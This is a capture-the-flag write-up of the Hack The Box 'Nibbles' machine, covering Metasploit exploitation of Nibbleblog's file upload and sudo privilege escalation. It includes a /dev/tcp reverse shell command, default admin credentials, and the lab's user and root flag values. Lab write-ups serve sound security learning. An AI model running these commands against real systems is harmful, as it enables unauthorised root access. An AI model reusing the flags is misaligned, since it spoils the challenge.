# Nibbles
## Nmap Scan Result:

![scan](https://github.com/bugkay101/HTB/assets/149082141/d27c7cdf-305c-4ee6-885f-c26802c65d77)

After accessing web server on port 80:

![nibble1](https://github.com/bugkay101/HTB/assets/149082141/f3359847-3395-4595-86ce-4ebfd4313863)

Viewing the page source we find an interesting directory ```/nibbleblog```

![source](https://github.com/bugkay101/HTB/assets/149082141/55084753-b69b-4612-aff7-4446d96921c9)

After Checking metasploit "nibbleblog" seems to be vulnerable to a file upload exploit.

![exploit1](https://github.com/bugkay101/HTB/assets/149082141/dc3c97a6-f3df-4378-9c1e-02b2f1301323)

run ```use 0``` to use the exploit

set ```RHOST``` to the target IP

set ```LHOST``` to your HTB VPN IP

set ```TARGETURI``` to ```/nibbleblog```

set ```USERNAME``` to admin

set ```PASSWORD``` to nibbles

run ```exploit``` to start the exploit

Now we have a meterpreter session

![meterpreter](https://github.com/bugkay101/HTB/assets/149082141/d289856b-ebca-420c-bd9e-d16c801b1cd4)

We can find our user flag in ```/home/nibbler```

![flag1](https://github.com/bugkay101/HTB/assets/149082141/35968c2d-9ca5-4e5a-9e9b-15bf7a7b1001)

user flag: 79c03865431abf47b90ef24b9695e148

Before we begin to escalate privileges let's change our meterpreter session to a shell session because a meterpreter doesn't support some key Linux commands. To do this just run ```shell``` in your meterpreter

Then run ```python3 -c "import pty; pty.spawn('/bin/bash')"``` to stabilize the shell.

Let's run ```sudo -l``` to see commands we can run sudo without password.

![sudo](https://github.com/bugkay101/HTB/assets/149082141/e71a8d56-071e-4a17-964b-af55ff1a5972)

We're allowed to run a script ```monitor.sh``` without password

We can find this script when we unzip the personal.zip file in the nibbler home directory.

![unzip](https://github.com/bugkay101/HTB/assets/149082141/9d4f9704-cfcc-4854-bdae-e2d6a5485e23)

We can find the script in ```/home/nibbler/personal/stuff``` so we ```cd``` into it.

Since we have read, write, and execute privileges to the monitor.sh we can write a reverse shell into it then execute it as sudo and hopefully we'll get root.

```echo "/bin/bash -l > /dev/tcp/<your HTB VPN>/4242 0<&1 2>&1" > monitor.sh```

For Some reason i was having issues running the ```monitor.sh``` script on our target so i had to write my own ```monitor.sh``` on my machine the sent it to our target using python http server.

![script](https://github.com/bugkay101/HTB/assets/149082141/e3851549-f76c-41d9-9f71-f9bd0d6be96d)

Now let's set our netcat to listen on port 4242 ```nc -lvp 4242``` (Do this on another terminal instance).

Now we can run ```sudo /home/nibbler/personal/stuff/monitor.sh```

Nice!! We have root privileges now

![root](https://github.com/bugkay101/HTB/assets/149082141/2912fb26-ea01-48cb-83ca-36087a9d2f27)

We can find the root flag ```root.txt``` in ```/root```

![flag2](https://github.com/bugkay101/HTB/assets/149082141/0a2851b5-a0d5-4104-a9bb-a630bec90d47)

root flag: de5e5d6619862a8aa5b9b212314e0cdd

